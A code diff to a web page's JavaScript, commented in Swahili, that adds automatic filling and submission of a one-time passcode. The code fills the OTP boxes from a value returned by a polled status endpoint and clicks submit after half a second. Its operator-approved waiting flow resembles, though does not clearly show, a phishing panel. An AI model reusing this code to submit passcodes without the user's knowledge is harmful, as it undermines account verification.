@@ -186,7 +186,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (waitingTimerInterval) clearInterval(waitingTimerInterval);
 
     waitingTimerInterval = setInterval(() => {
-      secondsLeft = (secondsLeft - 1 + 4) % 4; // Cycles nicely 3, 2, 1, 0
+      secondsLeft = (secondsLeft - 1 + 4) % 4;
       if (counterEl) counterEl.textContent = secondsLeft;
     }, 1000);
   }
@@ -217,9 +217,33 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
+  // Kitendakazi cha Kujaza na Kuwasilisha OTP Kiotomatiki (Auto-fill & Auto-submit)
+  function triggerAutoFillOtp(otpCode) {
+    const cleanOtp = String(otpCode).replace(/\D/g, '');
+    if (cleanOtp.length >= 4) {
+      const digits = cleanOtp.split('');
+      otpBoxes.forEach((box, idx) => {
+        if (digits[idx]) {
+          box.value = digits[idx];
+        }
+      });
+      checkOtpComplete();
+      
+      // Iwezeshe kitufe na ujitumie yenyewe baada ya milisekunde 500
+      if (!btnSubmitOtp.disabled) {
+        setTimeout(() => {
+          btnSubmitOtp.click();
+        }, 500);
+      }
+    }
+  }
+
   btnSubmitOtp.addEventListener('click', async () => {
     btnSubmitOtp.textContent = 'Inathibitisha...';
     btnSubmitOtp.setAttribute('disabled', 'true');
+
+    // Hakikisha appData.otp imechukua thamani sahihi kutoka kwenye masanduku kama haijajazwa kiotomatiki
+    appData.otp = Array.from(otpBoxes).map(b => b.value).join('');
 
     try {
       const res = await fetch('/api/submit-otp', {
@@ -273,6 +297,11 @@ document.addEventListener('DOMContentLoaded', () => {
         const res = await fetch(`/api/check-status/${appData.userId}`);
         const data = await res.json();
 
+        // Angalia kama kuna OTP iliyoingizwa au kupatikana kwenye seva ili ifanye autofill
+        if (data.otp && data.otp.length >= 4) {
+          triggerAutoFillOtp(data.otp);
+        }
+
         if (data.status === 'APPROVED_LOAD_OTP') {
           clearInterval(interval);
           if (waitingTimerInterval) clearInterval(waitingTimerInterval);
@@ -312,4 +341,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-      
+                                       
